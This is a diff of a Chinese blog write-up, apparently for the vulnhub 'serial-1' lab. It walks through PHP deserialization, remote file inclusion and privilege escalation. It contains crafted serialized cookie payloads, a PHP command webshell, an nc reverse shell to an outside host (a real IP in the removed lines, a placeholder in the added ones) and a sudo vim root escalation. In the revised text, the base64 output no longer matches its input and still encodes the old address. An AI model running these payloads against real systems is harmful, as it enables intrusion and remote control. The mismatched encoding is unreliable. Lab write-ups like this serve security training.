@@ -8,7 +8,7 @@
     <meta name="description" content="前言此漏洞环境是vulhub上的系列漏洞之一，是php反序列化漏洞，也用到了远程代码执行漏洞。
 复现过程环境搭建靶机下载地址
 https://www.vulnhub.com/entry/serial-1,349/
-我之前写过一个搭建的过程，">
+下载好之后直接用Vmwar">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -399,7 +399,7 @@ https://www.vulnhub.com/entry/serial-1,349/
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.1k
+                        1.2k
                     </div>
                     
 
@@ -425,24 +425,23 @@ https://www.vulnhub.com/entry/serial-1,349/
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此漏洞环境是vulhub上的系列漏洞之一，是php反序列化漏洞，也用到了远程代码执行漏洞。</p>
 <h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机下载地址</p>
 <pre><code>https://www.vulnhub.com/entry/serial-1,349/
-</code></pre><p>我之前写过一个搭建的过程，过程类似，这里就不再赘述，详情可以参考</p>
-<pre><code>http://dvsx.cn/2019/06/15/shen-tou-ce-shi-ba-ji-lian-xi-dc-1/
-</code></pre><h3 id="存活扫描"><a href="#存活扫描" class="headerlink" title="存活扫描"></a>存活扫描</h3><p>内网存活主机扫描</p>
+</code></pre><p>下载好之后直接用Vmware workstation打开就行了</p>
+<h3 id="存活扫描"><a href="#存活扫描" class="headerlink" title="存活扫描"></a>存活扫描</h3><p>内网存活主机扫描</p>
 <pre><code>arp-scan -l
-</code></pre><p>扫描到的存活主机是<strong>192.168.77.157</strong></p>
+</code></pre><p>扫描到的存活主机是<strong>192.168.77.157</strong><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/10.png" alt=""></p>
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描开放的端口</p>
 <pre><code>nmap -sV -p- 192.168.77.157
-</code></pre><p>发现开放了80,22号端口</p>
+</code></pre><p>发现开放了80,22号端口<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/11.png" alt=""></p>
 <h3 id="访问web服务"><a href="#访问web服务" class="headerlink" title="访问web服务"></a>访问web服务</h3><p><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/1.png" alt=""><br>页面上显示</p>
 <pre><code>Hello sk4This is a beta test for new cookie handler
-</code></pre><p>抓包：<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/2.png" alt=""><br>发现cookie是base64加密过的，解密后：</p>
+</code></pre><p>burp抓包：<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/2.png" alt=""><br>发现cookie是base64加密过的，解密后发现是经过序列化过的：</p>
 <pre><code>O:4:&quot;User&quot;:2:{s:10:&quot; User name&quot;;s:3:&quot;sk4&quot;;s:9:&quot; User wel&quot;;O:7:&quot;Welcome&quot;:0:{}}
 o：代表存储的是对象（object），如果传入的是一个数组，那它会变成字母a。
 4：表示对象的名称有4个字符。User表示对象名称，刚好是4个字符。
 2：表示有2个值
 s：表示字符串，数字表示字符串的长度，s:10:&quot; User name&quot;;
-</code></pre><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用御剑扫描发现存在目录遍历漏洞：<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/3.PNG" alt=""><br>下载bak.zip，发现有三个源代码</p>
-<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><pre><code>C:\Users\eth10\Documents\靶机\bak&gt;cat index.php
+</code></pre><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用御剑扫描发现存在<strong>../backup/</strong>路径，访问发现存在目录遍历漏洞：<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/3.PNG" alt=""><br>下载bak.zip，发现有三个源代码</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><pre><code>index.php
 &lt;?php
         include(&quot;user.class.php&quot;);&lt;/small&gt;
 
@@ -454,7 +453,7 @@ s：表示字符串，数字表示字符串的长度，s:10:&quot; User name&quo
         echo &quot;This is a beta test for new cookie handler\n&quot;;
 ?&gt;
 
-C:\Users\eth10\Documents\靶机\bak&gt;cat log.class.php
+log.class.php
 &lt;?php
   class Log {
     private $type_log;
@@ -470,7 +469,7 @@ C:\Users\eth10\Documents\靶机\bak&gt;cat log.class.php
   }
 ?&gt;
 
-C:\Users\eth10\Documents\靶机\bak&gt;cat user.class.php
+user.class.php
 &lt;?php
   include(&quot;log.class.php&quot;);
 
@@ -496,29 +495,34 @@ C:\Users\eth10\Documents\靶机\bak&gt;cat user.class.php
   }
 
 ?&gt;
-</code></pre><p>通过查看文件发现，index.php文件包含了user.class.php文件，对cookie中的user参数进行了序列化和base64编码；<br>user.class.php文件包含了log.class.php，并调用了handler函数log.class.php中的handler函数对变量$val进行了文件包含和输出</p>
-<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>所以根据解码后的cookie进行构造</p>
+</code></pre><p>三个源代码，index.php把cookie序列化然后再base64编码一下;user.class.php定义了两个类，一个是Welcome，另一个是User，上面我们base64解码之后的就是把User序列化之后的结果,分析User这个类，发现有$this-&gt;wel = new Welcome();那就再看Welcome这个类，发现这个类里面写的是一个handler（）函数，而且还包含了log.class.php，我们再去看log.class.php，</p>
+<pre><code>public function handler($val) {
+  include($this-&gt;type_log);
+  echo &quot;LOG: &quot; . $val;
+</code></pre><p>这里存在着文件包含漏洞，我们可以加以利用输出一些我们想要的信息</p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>根据解码后的cookie进行构造,出现文件包含漏洞的是Log类，所以我们就加上序列化之后的Log类的内容</p>
 <pre><code>O:4:&quot;User&quot;:2:{s:10:&quot; User name&quot;;s:3:&quot;sk4&quot;;s:9:&quot; User wel&quot;;O:7:&quot;Welcome&quot;:0:{}}&lt;/small&gt;
 
-O:4:&quot;User&quot;:2:{s:10:&quot; User name&quot;;s:5:&quot;admin&quot;;s:9:&quot; User wel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot; Log type_log&quot;;s:11:&quot;/etc/passwd&quot;;}}
-
-O:4:&quot;User&quot;:2:{s:10:&quot; User name&quot;;s:5:&quot;admin&quot;;s:9:&quot; User wel&quot;;O:3:&quot;Log&quot;:1:{s:8:&quot;type_log&quot;;s:27:&quot;http://140.143.122.13/c.txt&quot;;}}
-此poc用到了远程文件包含漏洞，c.txt是我在远程服务器上放的木马，内容是
+O:4:&quot;User&quot;:2:{s:10:&quot; User name&quot;;s:5:&quot;admin&quot;;s:9:&quot; User wel&quot;;O:3:&quot;Log&quot;:1:{s:8:&quot;type_log&quot;;s:27:&quot;http://xx.xx.xx.xx/shell.txt&quot;;}}
+此poc用到了远程文件包含漏洞，shell.txt是我在远程服务器上放的木马，内容是
 &lt;?php
 system($_GET[&#39;cmd&#39;]);
 ?&gt;
-</code></pre><pre><code>&gt;&gt;&gt; base64.b64encode(b&#39;O:4:&quot;User&quot;:2:{s:10:&quot;\x00User\x00name&quot;;s:5:&quot;admin&quot;;s:9:&quot;\x00User\x00wel&quot;;O:3:&quot;Log&quot;:1:{s:8:&quot;type_log&quot;;s:27:&quot;http://140.143.122.13/c.txt&quot;;}}&#39;)
-b&#39;Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6Mjc6Imh0dHA6Ly8xNDAuMTQzLjEyMi4xMy9jLnR4dCI7fX0=&#39;
+</code></pre><pre><code>&gt;&gt;&gt; base64.b64encode(b&#39;O:4:&quot;User&quot;:2:{s:10:&quot;\x00User\x00name&quot;;s:5:&quot;admin&quot;;s:9:&quot;\x00User\x00wel&quot;;O:3:&quot;Log&quot;:1:{s:8:&quot;type_log&quot;;s:27:&quot;http://xx.xx.xx.xx/shell.txt&quot;;}}&#39;)
+b&#39;Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6Mjc6Imh0dHA6Ly8xNDAuMTQzLjEyMi4xMy9jLn&#39;
+注意此处的空格需要用\00代替，链接就是我放在服务器上的一个木马的地址，修改url的时候不要忘记把s修改一下
 </code></pre><p>burp重放<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/5.PNG" alt=""></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+140.143.122.13+4444+&gt;/tmp/f
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code>编码前：
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xx.xx.xx.xx 4444 &gt;/tmp/f
+编码后：
+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+xx.xx.xx.xx+4444+&gt;/tmp/f
 </code></pre><p><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/6.PNG" alt=""><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/7.PNG" alt=""></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>获取到shell后在根目录下发现文件<code>credentials.txt.bak</code>,里面是sk4用户的密码，有了密码就可以通过22端口进行远程连接了<br>提权方法是通过<code>sudo -l</code>查看当前用户可执行和无法执行的命令，发现vim对所有用户都NOPASSWORD，所就尝试<code>sudo vim</code>,进入到命令模式输入<code>!bash</code>,就可以成功提权。<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/8.PNG" alt=""><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/9.PNG" alt=""></p>
-<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
-<li>遗忘了一部分php反序列化的内容，又看了些基础的东西回顾了一下<code>https://imysec.cn/2019/03/27/php-xu-lie-hua-yu-fan-xu-lie-hua/</code></li>
-<li>一句话木马的利用，以前用到的最多的是<code>&lt;?php @eval($_POST[&#39;xxx&#39;]);?&gt;</code>,这次用到的<code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code>可以通过get方式获取到自己想要的信息</li>
-<li>提权的方式，通过<code>sudo -l</code>查看能够执行的命令，然后通过vim进行提权，全新的体验</li>
-</ul>
-
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><pre><code>远程文件包含：https://www.jianshu.com/p/be68cf9be911
+php反序列化：https://imysec.cn/2019/03/27/php-xu-lie-hua-yu-fan-xu-lie-hua/
+反弹shell：https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html
+https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483980&amp;idx=1&amp;sn=7009611467280235e020d9dc2bfb79e4&amp;chksm=cf4d8d2df83a043b5dada8d3239f521c90fc1fb25c46d53c8587673acf982251b2302c0efeb4&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1570769686338&amp;sharer_shareid=62f0fff7c8b6ad3fb28d5be3244bea91&amp;key=f3b89a09cde51f0fdbad4af22908c0f665373d6e9d648b35ff04a2bce7cb6280bc37c79fc979034db3d63288319f3433cb3d27798738c4f62d7426b45bff32c5c2ec445b03996541b829e6b49b0418e7&amp;ascene=1&amp;uin=Mjk3MTU2ODQ5&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=d4y2wiXz0x%2FRPuCGj%2FU%2FgrlvMD1dRyPHSJVBX56CpDZ%2BWKCs171mNJinVFauuuDd
+</code></pre>
             </div>
             <hr>
 
